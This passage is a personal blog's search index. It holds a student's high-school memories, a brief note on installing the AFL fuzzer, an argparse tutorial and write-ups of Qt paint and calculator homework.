pi）lx，闲的没事可以一起闲逛拍片喝咖啡的单身人士hzz，想不到一起上了六年课大学了还能在一个班里上课的hjl，太多了太多了。其实现在想想，我的同学们身上真的带了很多天津人的“贫”，扯起淡是真的好笑。 还得提一句，远在地球的另一端，抱着一年也就见一次的想法，说起话来脸都不要了的will同学哈哈哈哈哈哈xswl 希望黄神出片质量越来越高 6.你们班最美的姑娘这个发言权还是交给男生吧，反正不是我，有几位真的是好多男生追😏，真正见识了“重色轻友” 7.最喜欢上谁的课这太多了，大多都很喜欢 高一升高二得知化学老师换了的失望，但新老师也很喜欢 马总走进教室时同学们的掌声 学校停电，走进教室灯突然全亮了的希哥 温柔的王老师 现在回忆我们简直觉得我们就是“天使”的吴老师哈哈哈 大一一起吃饭聊天的陈老师 还是各位讲课思路清晰的老师们❤ 8.最喜欢学校的哪个地方各种风格的建筑 和 有海棠花的地方 9.一次躲跑操/跑操的经历我们（6班）跑着跑着就冲散了前面五班的队伍😥 10.运动会高一跳高崴脚曹老师背我宋神开车把我送到医院 11.值周偷偷背课文？ 某个臭弟弟查出勤数数被我打乱了 12.最奇葩的作业/试卷题目“国庆大礼包”算是惊喜 但这个“小农包”可太难听了🤦‍ 13.一次糟糕的天气我们是祖国的绿萝花🌳 14.午休经常做什么睡觉写题朝bsb扔橘子皮 15.隔壁班的帅气小哥哥隔壁厕所 其它班的还是蛮多的，不认识我的就不说了 这里提一下和我一起见证凌晨四点洛杉矶的臭弟弟们，还有一位我一定要提一下 我五年级就认识lxb了他居然没印象？？？？高二才认识我，高三考试的时候经常能见到吧，毕业典礼疯狂偶遇拍照（唯一一位显得我脸色蜡黄的兄弟），穿着西服拿着花站在阳光底下笑着跟我说要给我变个魔术真的可！！！ 还有初三时喜欢的学长？？反正当时觉得挺帅的，后来觉得他女朋友比他好看太多つ﹏⊂ 16.最怀念的地方瑞庭礼堂和满园海棠花 17.伤心的回忆辜负了几个人吧，对不起 本无恶意，但却伤了人 18.一段不为人知的故事我也不知道还有什么事别人都不知道 19.会像主动向别人分享的故事性格开朗广泛交友后来幡然醒悟改过自新？ 20.从来没去过的地方翔宇楼天台 21.别开生面的学校活动百团大战？ 在龙哥的带领下趴在地上画坑 说起来真的挺可惜的，nk在”追求高考成绩“的大环境下失去了太多 吹一波书画社 22.同学们的奇怪的昵称/绰号八卦相关🙂 23.军训坐在第一排看小姐姐们跳舞 24.一个很有趣的同学黄教官哈哈哈哈哈 他真的太有趣了哈哈哈哈 25.校园传说（空） 但历史悠久 26.讲讲寝室/走读的事上学路上的同学们 一起在地铁上玩游戏的lx 考完试可以去同学家玩 27.高三一起上晚自习的同学们 在金牌楼下大声唱”对面的女孩看过来“的fj，和女生宿舍楼里传出的回应”看个p“ 六年唯一的一年没有空调 28.高考前一周不停地做卷子，班里剩的人也不多了，气氛还是比较轻松的 29.毕业典礼六年真的是要结束了啊 30.如果回到高中开学的前一天你会对当初的自己说什么？且行且珍惜，笔芯♥ 最后","categories":[{"name":"my life :)","slug":"my-life","permalink":"https://gitee.com/michelle19l/michelle19l/categories/my-life/"}],"tags":[]},{"title":"高中回忆30条","slug":"mylife/中学回忆","date":"2020-02-24T13:21:40.000Z","updated":"2020-05-26T09:11:29.798Z","comments":true,"path":"2020/02/24/mylife/中学回忆/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/02/24/mylife/%E4%B8%AD%E5%AD%A6%E5%9B%9E%E5%BF%86/","excerpt":"海棠花瓣会随风吹散，但记忆不会🌸","text":"海棠花瓣会随风吹散，但记忆不会🌸 1.你为什么选择这个高中因为一些原因在nkzx带了六年，没有其它的选择，百年学府、文化底蕴、人文气息，初中三年给我留下了很多美好的回忆，没有过离开的想法。很幸运能在这里度过自己的12岁到18岁，其实不只是和伙伴一起成长，老师见证了我们的青春，我们也是老师人生历程的一部分吧，从第一年教学生，到结婚，再到生子；或者看着某位老师从头发旺盛到emmm，时间真的是个很奇妙的东西 2.它的地理位置，周围建筑南开洼，真的洼，雨下大了水没过膝盖 周围建筑哈哈哈，那就是学校周围的各种快餐店了哈哈哈，见证了几个711的开张又关张（中学时觉得711还挺好吃的，到了大学，唉） 3.初见面六年级的冬令营，当时班里还有四个和我一天生日的同学 4.讲一下你的班主任吧初中换了几位班主任，都对我很好。高中是充满智慧的宋神嘻嘻，突然想起来某位同学上课看球赛直播发说说感慨忘记屏蔽班主任了哈哈哈 5.你最好的同学大多是六年都在一个班的同学。其实我所处的这个体制有一点弊端就是高中之后大多数同学还是和初中关系好的同学交往，再和其他人建立非常亲密的同学关系稍微有点苦难，有点可惜。但是六年下来还是收获了不少朋友，可以一起躺在床上聊天的xyy，一起约自习的（han pi）lx，闲的没事可以一起闲逛拍片喝咖啡的单身人士hzz，想不到一起上了六年课大学了还能在一个班里上课的hjl，太多了太多了。其实现在想想，我的同学们身上真的带了很多天津人的“贫”，扯起淡是真的好笑。 还得提一句，远在地球的另一端，抱着一年也就见一次的想法，说起话来脸都不要了的will同学哈哈哈哈哈哈xswl 希望黄神出片质量越来越高 6.你们班最美的姑娘这个发言权还是交给男生吧，反正不是我，有几位真的是好多男生追😏，真正见识了“重色轻友” 7.最喜欢上谁的课这太多了，大多都很喜欢 高一升高二得知化学老师换了的失望，但新老师也很喜欢 马总走进教室时同学们的掌声 学校停电，走进教室灯突然全亮了的希哥 温柔的王老师 现在回忆我们简直觉得我们就是“天使”的吴老师哈哈哈 大一一起吃饭聊天的陈老师 还是各位讲课思路清晰的老师们❤ 8.最喜欢学校的哪个地方各种风格的建筑 和 有海棠花的地方 9.一次躲跑操/跑操的经历我们（6班）跑着跑着就冲散了前面五班的队伍😥 10.运动会高一跳高崴脚曹老师背我宋神开车把我送到医院 11.值周偷偷背课文？ 某个臭弟弟查出勤数数被我打乱了 12.最奇葩的作业/试卷题目“国庆大礼包”算是惊喜 但这个“小农包”可太难听了🤦‍ 13.一次糟糕的天气我们是祖国的绿萝花🌳 14.午休经常做什么睡觉写题朝bsb扔橘子皮 15.隔壁班的帅气小哥哥隔壁厕所 其它班的还是蛮多的，不认识我的就不说了 这里提一下和我一起见证凌晨四点洛杉矶的臭弟弟们，还有一位我一定要提一下 我五年级就认识lxb了他居然没印象？？？？高二才认识我，高三考试的时候经常能见到吧，毕业典礼疯狂偶遇拍照（唯一一位显得我脸色蜡黄的兄弟），穿着西服拿着花站在阳光底下笑着跟我说要给我变个魔术真的可！！！ 还有初三时喜欢的学长？？反正当时觉得挺帅的，后来觉得他女朋友比他好看太多つ﹏⊂ 16.最怀念的地方瑞庭礼堂和满园海棠花 17.伤心的回忆辜负了几个人吧，对不起 本无恶意，但却伤了人 18.一段不为人知的故事我也不知道还有什么事别人都不知道 19.会像主动向别人分享的故事性格开朗广泛交友后来幡然醒悟改过自新？ 20.从来没去过的地方翔宇楼天台 21.别开生面的学校活动百团大战？ 在龙哥的带领下趴在地上画坑 说起来真的挺可惜的，nk在”追求高考成绩“的大环境下失去了太多 吹一波书画社 22.同学们的奇怪的昵称/绰号八卦相关🙂 23.军训坐在第一排看小姐姐们跳舞 24.一个很有趣的同学黄教官哈哈哈哈哈 他真的太有趣了哈哈哈哈 25.校园传说（空） 但历史悠久 26.讲讲寝室/走读的事上学路上的同学们 一起在地铁上玩游戏的lx 考完试可以去同学家玩 27.高三一起上晚自习的同学们 在金牌楼下大声唱”对面的女孩看过来“的fj，和女生宿舍楼里传出的回应”看个p“ 六年唯一的一年没有空调 28.高考前一周不停地做卷子，班里剩的人也不多了，气氛还是比较轻松的 29.毕业典礼六年真的是要结束了啊 30.如果回到高中开学的前一天你会对当初的自己说什么？且行且珍惜，笔芯♥ 最后","categories":[{"name":"my life :)","slug":"my-life","permalink":"https://gitee.com/michelle19l/michelle19l/categories/my-life/"}],"tags":[]},{"title":"AFL的安装与使用","slug":"AFL的安装与使用","date":"2020-02-19T09:06:03.000Z","updated":"2020-04-13T10:17:29.266Z","comments":true,"path":"2020/02/19/AFL的安装与使用/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/02/19/AFL%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/","excerpt":"运行环境：kali2020.1","text":"运行环境：kali2020.1 安装git clone https:&#x2F;&#x2F;github.com&#x2F;google&#x2F;AFL.gitcd AFLmake sudo make install 使用export CC=afl-clang；export CXX=afl-clang++； 成功1：https://xz.aliyun.com/t/4314 成功2：https://www.secpulse.com/archives/71876.html 标注： 文中的ELF文件：在fuzz_input文件夹中新建一个testcase.ELF文件","categories":[{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/categories/AFL/"}],"tags":[{"name":"AFL","slug":"AFL","permalink":"https://gitee.com/michelle19l/michelle19l/tags/AFL/"},{"name":"漏洞挖掘","slug":"漏洞挖掘","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"},{"name":"linux","slug":"linux","permalink":"https://gitee.com/michelle19l/michelle19l/tags/linux/"},{"name":"工具","slug":"工具","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%B7%A5%E5%85%B7/"},{"name":"模糊测试","slug":"模糊测试","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E6%A8%A1%E7%B3%8A%E6%B5%8B%E8%AF%95/"}]},{"title":"Hello World","slug":"hello-world","date":"2020-02-14T15:04:03.719Z","updated":"2020-02-14T15:04:03.719Z","comments":true,"path":"2020/02/14/hello-world/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/02/14/hello-world/","excerpt":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub.","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new \"My New Post\" More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment","categories":[],"tags":[]},{"title":"利用argparse编写python命令行工具","slug":"python/argparse","date":"2020-01-21T05:06:36.000Z","updated":"2021-01-22T06:06:40.589Z","comments":true,"path":"2020/01/21/python/argparse/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2020/01/21/python/argparse/","excerpt":"","text":"官方文档https://docs.python.org/zh-cn/3.7/howto/argparse.htmlhttps://docs.python.org/zh-cn/3.7/library/argparse.html#module-argparse 基础功能--help 选项，也可缩写为 -h，是唯一一个可以直接使用的选项 基础import argparseparser = argparse.ArgumentParser()parser.parse_args() 位置参数默认参数类型import argparseparser = argparse.ArgumentParser()# add_argument用于指定程序能够接受哪些命令行选项parser.add_argument(\"echo\", help=\"echo the string you use here\")args = parser.parse_args()print(args.echo) &gt;python exer.py -husage: exer.py [-h] echopositional arguments: echooptional arguments: -h, --help show this help message and exit 接收echo参数（字符串格式），并打印 &gt;python exer.py helloworldhelloworld 其它类型import argparseparser = argparse.ArgumentParser()parser.add_argument(\"square\", help=\"display a square of a given number\", type=int)# 指定为int类型args = parser.parse_args()print(args.square**2) 计算平方 &gt;python exer.py 525 可选参数import argparseparser = argparse.ArgumentParser()parser.add_argument(\"--verbosity\", help=\"increase output verbosity\")args = parser.parse_args()if args.verbosity: # 如果一个可选参数没有被使用时，相关变量被赋值为 None，在此例中是 args.verbosity print(\"verbosity turned on\") 不输入参数不报错 &gt;python exer.py help &gt;python exer.py -husage: exer.py [-h] [--verbosity VERBOSITY]optional arguments: -h, --help show this help message and exit --verbosity VERBOSITY increase output verbosity 需要指定参数的具体值 &gt;python exer.py --verbosityusage: exer.py [-h] [--verbosity VERBOSITY]exer.py: error: argument --verbosity: expected one argument &gt;python exer.py --verbosity 1verbosity turned on action=store_true &quot;store_true&quot;意味着，当这一选项存在时，为 args.verbose 赋值为 True。没有指定时则隐含地赋值为 False。 parser.add_argument(\"--verbose\", help=\"increase output verbosity\", action=\"store_true\") 短选项parser.add_argument(\"-v\", \"--verbose\", help=\"increase output verbosity\", action=\"store_true\") &gt;python exer.py -husage: exer.py [-h] [-v]optional arguments: -h, --help show this help message and exit -v, --verbose increase output verbosity 此时，该项依旧为可选项。若去掉--verbose只留下-v，则该项为必需项 结合位置参数和可选参数import argparseparser = argparse.ArgumentParser()parser.add_argument(\"square\", type=int, help=\"display a square of a given number\")parser.add_argument(\"-v\", \"--verbose\", action=\"store_true\", help=\"increase output verbosity\")args = parser.parse_args()answer = args.square**2if args.verbose: print(\"the square of &#123;&#125; equals &#123;&#125;\".format(args.square, answer))else: print(answer) &gt;python exer.py -husage: exer.py [-h] [-v] squarepositional arguments: square display a square of a given numberoptional arguments: -h, --help show this help message and exit -v, --verbose increase output verbosity 若没有参数，则报错 两个参数的顺序可以颠倒 &gt;python exer.py 5 -vthe square of 5 equals 25 &gt;python exer.py -v 5the square of 5 equals 25 参数取值范围限制import argparseparser = argparse.ArgumentParser()parser.add_argument(\"square\", type=int, help=\"display a square of a given number\")# 限制取值为0，1，2，若赋其他值，则报错parser.add_argument(\"-v\", \"--verbosity\", type=int, choices=[0, 1, 2], help=\"increase output verbosity\")args = parser.parse_args()answer = args.square**2if args.verbosity == 2: print(\"the square of &#123;&#125; equals &#123;&#125;\".format(args.square, answer))elif args.verbosity == 1: print(\"&#123;&#125;^2 == &#123;&#125;\".format(args.square, answer))else: print(answer) &gt;python exer.py -v 2 4the square of 4 equals 16 &gt;python exer.py -v 1 44^2 &#x3D;&#x3D; 16 &gt;python exer.py 416 &gt;python exer.py -v 0 416 action=”count” 参数值为该参数出现了几次 import argparseparser = argparse.ArgumentParser()parser.add_argument(\"square\", type=int, help=\"display the square of a given number\")parser.add_argument(\"-v\", \"--verbosity\", action=\"count\", help=\"increase output verbosity\")args = parser.parse_args()answer = args.square**2if args.verbosity == 2: print(\"the square of &#123;&#125; equals &#123;&#125;\".format(args.square, answer))elif args.verbosity == 1: print(\"&#123;&#125;^2 == &#123;&#125;\".format(args.square, answer))else: print(answer) &gt;python exer.py -v 00^2 &#x3D;&#x3D; 0 &gt;python exer.py -v 0 -vthe square of 0 equals 0 &gt;python exer.py -vv 0the square of 0 equals 0 关键字default parser.add_argument(\"-v\", \"--verbosity\", action=\"count\", default=0, help=\"increase output verbosity\") 默认情况下如果一个可选参数没有被指定，它的值会是 None，并且它不能和整数值相比较（所以产生了 TypeError 异常）。 改进import argparseparser = argparse.ArgumentParser()parser.add_argument(\"x\", type=int, help=\"the base\")parser.add_argument(\"y\", type=int, help=\"the exponent\")parser.add_argument(\"-v\", \"--verbosity\", action=\"count\", default=0)args = parser.parse_args()answer = args.x**args.yif args.verbosity &gt;= 2: print(\"&#123;&#125; to the power &#123;&#125; equals &#123;&#125;\".format(args.x, args.y, answer))elif args.verbosity &gt;= 1: print(\"&#123;&#125;^&#123;&#125; == &#123;&#125;\".format(args.x, args.y, answer))else: print(answer) 修改部分内容为 if args.verbosity &gt;= 2: print(\"Running '&#123;&#125;'\".format(__file__)) # 输出文件名 &gt;python exer.py -vv 0 8Running &#39;exer.py&#39;0^8 &#x3D;&#x3D; 0 矛盾选项import argparseparser = argparse.ArgumentParser(description=\"calculate X to the power of Y\")group = parser.add_mutually_exclusive_group()group.add_argument(\"-v\", \"--verbose\", action=\"store_true\")group.add_argument(\"-q\", \"--quiet\", action=\"store_true\")parser.add_argument(\"x\", type=int, help=\"the base\")parser.add_argument(\"y\", type=int, help=\"the exponent\")args = parser.parse_args()answer = args.x**args.yif args.quiet: print(answer)elif args.verbose: print(\"&#123;&#125; to the power &#123;&#125; equals &#123;&#125;\".format(args.x, args.y, answer))else: print(\"&#123;&#125;^&#123;&#125; == &#123;&#125;\".format(args.x, args.y, answer)) 参数-v和-q不可以同时使用 argparse — 命令行选项、参数和子命令解析器https://docs.python.org/zh-cn/3.7/library/argparse.html#argparse.ArgumentParser.add_argument 官方文档写的太好了，我重写一遍意义不大，大家直接去看官方文档吧 add_argument() 方法 ArgumentParser.add_argument(name or flags…[, action][, nargs][, const][, default][, type][, choices][, required][, help][, metavar][, dest]) 定义单个的命令行参数应当如何解析。每个形参都在下面有它自己更多的描述，长话短说有： name or flags - 一个命名或者一个选项字符串的列表，例如 foo 或 -f, --foo。 action - 当参数在命令行中出现时使用的动作基本类型。 nargs - 命令行参数应当消耗的数目。 const - 被一些 action 和 nargs 选择所需求的常数。 default - 当参数未在命令行中出现时使用的值。 type - 命令行参数应当被转换成的类型。 choices - 可用的参数的容器。required - 此命令行选项是否可省略 （仅选项可用）。 help - 一个此选项作用的简单描述。 metavar - 在使用方法消息中使用的参数值示例。 dest - 被添加到 parse_args() 所返回对象上的属性名。 actionstore ...: parser = argparse.ArgumentParser() ...: parser.add_argument('--foo', action='store_true') ...: parser.add_argument('--bar', action='store_false') ...: parser.add_argument('--baz', action='store_false') ...: parser.parse_args('--foo --bar'.split())Out[2]: Namespace(bar=False, baz=True, foo=True)","categories":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/categories/python/"}],"tags":[{"name":"python","slug":"python","permalink":"https://gitee.com/michelle19l/michelle19l/tags/python/"},{"name":"argparse","slug":"argparse","permalink":"https://gitee.com/michelle19l/michelle19l/tags/argparse/"},{"name":"命令行","slug":"命令行","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%91%BD%E4%BB%A4%E8%A1%8C/"}]},{"title":"Qt作业二：画图板","slug":"Qt/Qt作业二——画图板","date":"2019-08-31T04:00:00.000Z","updated":"2020-04-30T07:39:25.220Z","comments":true,"path":"2019/08/31/Qt/Qt作业二——画图板/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2019/08/31/Qt/Qt%E4%BD%9C%E4%B8%9A%E4%BA%8C%E2%80%94%E2%80%94%E7%94%BB%E5%9B%BE%E6%9D%BF/","excerpt":"","text":"一、界面设计利用designer设计menubar和toolbar遇到的问题和解决方法：toolbar和menubar重叠，拖动toolbar部件至屏幕右侧即可。menubar中可以添加子选项 二、paint类属性QPixmap *pix;&#x2F;&#x2F;设置画图背景QPoint start;&#x2F;&#x2F;鼠标按下时的坐标QPoint end;&#x2F;&#x2F;鼠标抬起时的坐标int status;&#x2F;&#x2F;画图状态，1：直线，2：矩形，3：椭圆，4：自由绘图QPen pen;&#x2F;&#x2F;设置线条的属性QBrush brush;&#x2F;&#x2F;设置填充属性 三、paint类protected成员protected: void mousePressEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标按下事件 void mouseMoveEvent(QMouseEvent *event);&#x2F;&#x2F;鼠标移动事件 void mouseReleaseEvent(QMouseEvent *);&#x2F;&#x2F;鼠标释放事件 void paintEvent(QPaintEvent*);&#x2F;&#x2F;绘画事件 函数定义： void paint::mousePressEvent(QMouseEvent *event)&#123; start&#x3D;event-&gt;pos();&#x2F;&#x2F;获得鼠标点击坐标&#125;void paint::mouseReleaseEvent(QMouseEvent *event)&#123; end&#x3D;event-&gt;pos(); qDebug()&lt;&lt;start&lt;&lt;endl&lt;&lt;end&lt;&lt;endl; QPainter *painter&#x3D;new QPainter(pix); painter-&gt;setPen(pen);&#x2F;&#x2F;设置线条属性 painter-&gt;setBrush(brush);&#x2F;&#x2F;设置笔刷属性 switch (status) &#123; case 1:&#x2F;&#x2F;画直线 &#123; painter-&gt;drawLine(start,end); break; &#125; case 2:&#x2F;&#x2F;画矩形 &#123; int width&#x3D;end.x()-start.x(); int height&#x3D;end.y()-start.x(); painter-&gt;drawRect(start.x(),start.y(),width,height); break; &#125; case 3:&#x2F;&#x2F;画椭圆 &#123; int width&#x3D;end.x()-start.x(); int height&#x3D;end.y()-start.x(); painter-&gt;drawEllipse(start.x(),start.y(),width,height); break; &#125; &#125; this-&gt;update(); delete painter;&#125;void paint::paintEvent(QPaintEvent *)&#123; QPainter painter(this); painter.drawPixmap(QPoint(0, 0), *pix);&#125;void paint:: mouseMoveEvent(QMouseEvent *event)&#123; if(status&#x3D;&#x3D;4)&#x2F;&#x2F;绘制鼠标移动轨迹 &#123; QPainter* painter&#x3D;new QPainter(pix); end&#x3D;event-&gt;pos(); painter-&gt;setPen(pen); painter-&gt;drawLine(start,end);&#x2F;&#x2F;每一次移动画直线 this-&gt;update(); start&#x3D;end;&#x2F;&#x2F;下一次绘制的开始点是这次的结束点 delete painter;&#x2F;&#x2F;若无delete则只可以绘制一次 &#125;&#125; 遇到的问题和解决方法：painter在完成每次绘制时需delete，否则无法进行下一次绘制 四、构造函数paint::paint(QWidget *parent) : QMainWindow(parent), ui(new Ui::paint)&#123; ui-&gt;setupUi(this); &#x2F;&#x2F;设置画布 pix&#x3D;new QPixmap(this-&gt;size()*5); pix-&gt;fill(Qt::white); &#x2F;&#x2F;设置初使属性 brush.setColor(Qt::NoBrush); status&#x3D;1; &#x2F;&#x2F;连接信号和槽 connect(ui-&gt;line,SIGNAL(triggered(bool)),this,SLOT(status_line())); connect(ui-&gt;rect,SIGNAL(triggered(bool)),this,SLOT(status_rect())); connect(ui-&gt;ellipse,SIGNAL(triggered(bool)),this,SLOT(status_ellipse())); connect(ui-&gt;actionfree,SIGNAL(triggered(bool)),this,SLOT(status_free())); connect(ui-&gt;actionred,SIGNAL(triggered(bool)),this,SLOT(change_color_red())); connect(ui-&gt;actionblue,SIGNAL(triggered(bool)),this,SLOT(change_color_blue())); connect(ui-&gt;actiongreen,SIGNAL(triggered(bool)),this,SLOT(change_color_green())); connect(ui-&gt;actionblack,SIGNAL(triggered(bool)),this,SLOT(change_color_black())); connect(ui-&gt;action2,SIGNAL(triggered(bool)),this,SLOT(penwidth2())); connect(ui-&gt;action5,SIGNAL(triggered(bool)),this,SLOT(penwidth5())); connect(ui-&gt;action8,SIGNAL(triggered(bool)),this,SLOT(penwidth8())); connect(ui-&gt;action10,SIGNAL(triggered(bool)),this,SLOT(penwidth10())); connect(ui-&gt;solid_line,SIGNAL(triggered(bool)),this,SLOT(set_solid())); connect(ui-&gt;dash_line,SIGNAL(triggered(bool)),this,SLOT(set_dash())); connect(ui-&gt;dash_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdot())); connect(ui-&gt;dash_dot_dot,SIGNAL(triggered(bool)),this,SLOT(set_dashdotdot())); connect(ui-&gt;dot_line,SIGNAL(triggered(bool)),this,SLOT(set_dot())); connect(ui-&gt;fred,SIGNAL(triggered(bool)),this,SLOT(set_fill_red())); connect(ui-&gt;fblue,SIGNAL(triggered(bool)),this,SLOT(set_fill_blue())); connect(ui-&gt;fblack,SIGNAL(triggered(bool)),this,SLOT(set_fill_black())); connect(ui-&gt;fgreen,SIGNAL(triggered(bool)),this,SLOT(set_fill_green())); connect(ui-&gt;solid_pattern,SIGNAL(triggered(bool)),this,SLOT(set_solid_pattern())); connect(ui-&gt;dense_pattern,SIGNAL(triggered(bool)),this,SLOT(set_dense_pattern())); connect(ui-&gt;none,SIGNAL(triggered(bool)),this,SLOT(set_none_pattern()));&#125; 遇到的问题和解决方法： 可以获得鼠标事件坐标，但无法绘制，解决方法：pix&#x3D;new QPixmap(this-&gt;size()*5);&#x2F;&#x2F;结构函数QPainter *painter&#x3D;new QPainter(pix);&#x2F;&#x2F;绘制函数 点击menubar中label发出的信号槽函数无法接收到：原connect写法：connect(ui-&gt;line,SIGNAL(clicked()),this,SLOT(status_line()));将clicked()改为triggered(bool)即可 五、槽函数：public slots: &#x2F;&#x2F;设置绘制形状 void status_line(); void status_rect(); void status_ellipse(); void status_free();&#x2F;&#x2F;绘制鼠标轨迹 &#x2F;&#x2F;设置线条颜色 void change_color_blue(); void change_color_red(); void change_color_green(); void change_color_black(); &#x2F;&#x2F;设置线条宽度 void penwidth2(); void penwidth5(); void penwidth8(); void penwidth10(); &#x2F;&#x2F;设置线条样式 void set_solid(); void set_dash(); void set_dot(); void set_dashdot(); void set_dashdotdot(); &#x2F;&#x2F;设置填充颜色 void set_fill_red(); void set_fill_blue(); void set_fill_green(); void set_fill_black(); &#x2F;&#x2F;设置填充样式 void set_solid_pattern(); void set_dense_pattern(); void set_none_pattern(); 槽函数定义示例：void paint::status_line()&#123; status&#x3D;1;&#125; void paint::change_color_red()&#123; pen.setColor(Qt::red); &#x2F;&#x2F;注意书写格式，不可以写为pen.setColor(&quot;red&quot;);否则无法传入颜色&#125; void paint::penwidth5()&#123; pen.setWidth(5);&#125; void paint::set_dash()&#123; pen.setStyle(Qt::DashLine);&#125; void paint::set_fill_blue()&#123; brush.setColor(Qt::blue);&#125; void paint::set_dense_pattern()&#123; brush.setStyle(Qt::Dense7Pattern);&#125; void paint::set_none_pattern()&#123; brush.setStyle(Qt::NoBrush);&#125; 遇到的问题和解决方法 信号和槽函数无法连接： 检查信号和发送信号的来源是否对应 检查信号和槽的拼写是否准确 利用qDebug()进行调试 brush必须设置填充样式，否则无法填充 六、成果展示","categories":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/categories/Qt/"}],"tags":[{"name":"Qt","slug":"Qt","permalink":"https://gitee.com/michelle19l/michelle19l/tags/Qt/"},{"name":"大一","slug":"大一","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E5%A4%A7%E4%B8%80/"},{"name":"作业","slug":"作业","permalink":"https://gitee.com/michelle19l/michelle19l/tags/%E4%BD%9C%E4%B8%9A/"}]},{"title":"Qt作业一：计算器","slug":"Qt/Qt作业一","date":"2019-08-31T04:00:00.000Z","updated":"2020-04-30T07:39:33.271Z","comments":true,"path":"2019/08/31/Qt/Qt作业一/","link":"","permalink":"https://gitee.com/michelle19l/michelle19l/2019/08/31/Qt/Qt%E4%BD%9C%E4%B8%9A%E4%B8%80/","excerpt":"","text":"ui界面对应的ui_*.h文件的作用：ui_.h是ui界面的代码化表达，即用非Qt软件打开ui文件时会显示ui_*.h文件，用代码描述ui界面内容 计算器程序：1.通过Qt designer设计界面： 出现的问题和解决方法： 窗口对象名（QWidget类）要和对窗口进行操作的父类类名一致，否则会提示“引用了不完整的类型” 注意修改按钮名称以便下一步 2.使用QSignalMapper：signalmapper&#x3D;new QSignalMapper (this);QObjectList list &#x3D;this-&gt;children();&#x2F;&#x2F;list为全部按钮foreach(QObject *oc,list)&#x2F;&#x2F;遍历list中的按钮&#123; if(oc-&gt;objectName()!&#x3D;&quot;gridLayout&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;display&quot;&amp;&amp;oc-&gt;objectName()!&#x3D;&quot;&quot;)&#x2F;&#x2F;排除不需要链接槽函数clicked()的多余按钮 &#123; QPushButton *pushbutton&#x3D;qobject_cast&lt;QPushButton *&gt;(oc);&#x2F;&#x2F;利用qobject——cast进行类型转换 connect(pushbutton,SIGNAL(clicked()),signalmapper,SLOT(map()));&#x2F;&#x2F;将信号链接到signnalmapper上 signalmapper-&gt;setMapping(pushbutton,pushbutton-&gt;text()); &#125;&#125;connect(signalmapper,SIGNAL(mapped(QString)),this,SLOT(clicked(QString)));&#x2F;&#x2F;将signalmapper连接至槽函数clicked（QString）上，即实现将所需按钮链接至一个槽函数 出现的问题和解决方法： 理解QSignalMapper的工作原理和方法： qsignalmapper:相当于一个信号转发器，将多个按钮信号连接到一个槽函数上（详见代码注释） 引入QSignalMapper头文件 还有一种获取按钮列表的方法：QString buttontext &#x3D; &quot;btn1,btn2,btn3,btn4,btn5,btn6,btn7,btn8,btn9,btn10&quot;; QStringList texts &#x3D; buttontext.split(&quot;,&quot;); 也可利用按钮名字的共性筛选出所需要的按钮：if(oc-&gt;nbjectName.starswith(&quot;***&quot;) 最初设计ui时将所有按钮放到了gridlayout下，结果到至按钮无法访问，将按钮挪出gridlayout，若需使按钮排列整齐，designer界面上方有辅助排列功能按键。 ###3.计算功能的实现：头文件声明： node类 class node&#123;public: node(); double data;&#x2F;&#x2F;字符串转成double后存储在data中 QString sign;&#x2F;&#x2F;如果时运算符节点，用sign记录运算符 QString nums;&#x2F;&#x2F;以字符串形式存储double类型的数据 node* next;&#125;; widget类：//计算器类 将按钮上的内容输入到字符串中：void Widget::clicked(QString ch)&#123; if(ch&#x3D;&#x3D;&quot;sqrt&quot;) opt.append(&quot;k&quot;); else if(ch&#x3D;&#x3D;&quot;square&quot;) opt.append(&quot;p&quot;); else if(ch&#x3D;&#x3D;&quot;rev&quot;) opt.append(&quot;d&quot;); else if(ch&#x3D;&#x3D;&quot;neg&quot;) opt.append(&quot;f&quot;); else if(ch&#x3D;&#x3D;&quot;&#x3D;&quot;) &#123; opt.append(&quot;&#x3D;\\0&quot;); cal(); &#125; else &#123; opt.append(ch); &#125; ui-&gt;display-&gt;setPlainText(opt);&#x2F;&#x2F;显示输入内容&#125; 将字符串转成链表 QString 转 double：t-&gt;data&#x3D;t-&gt;nums.toDouble; 实现节点与节点的计算void Widget::calculate(node*a,node*b,node*c)&#123; if (b-&gt;sign &#x3D;&#x3D; &#39;+&#39;) a-&gt;data &#x3D; a-&gt;data + c-&gt;data; if (b-&gt;sign &#x3D;&#x3D; &#39;-&#39;) a-&gt;data &#x3D; a-&gt;data - c-&gt;data; if (b-&gt;sign &#x3D;&#x3D; &#39;*&#39;) a-&gt;data &#x3D; a-&gt;data * c-&gt;data; if (b-&gt;sign &#x3D;&#x3D; &#39;&#x2F;&#39;) a-&gt;data &#x3D; a-&gt;data &#x2F; c-&gt;data;&#x2F;&#x2F;节点合并 if (tail !&#x3D; c) &#123; a-&gt;next&#x3D;c-&gt;next; &#125; else &#123; a-&gt;next&#x3D;nullptr; tail&#x3D;a; &#125;&#125; void Widget:: calculate(node*a,node*b)&#123; if (b-&gt;sign &#x3D;&#x3D; &#39;k&#39;) a-&gt;data &#x3D; sqrt(a-&gt;data); if (b-&gt;sign &#x3D;&#x3D; &#39;p&#39;) a-&gt;data *&#x3D; a-&gt;data; if (b-&gt;sign 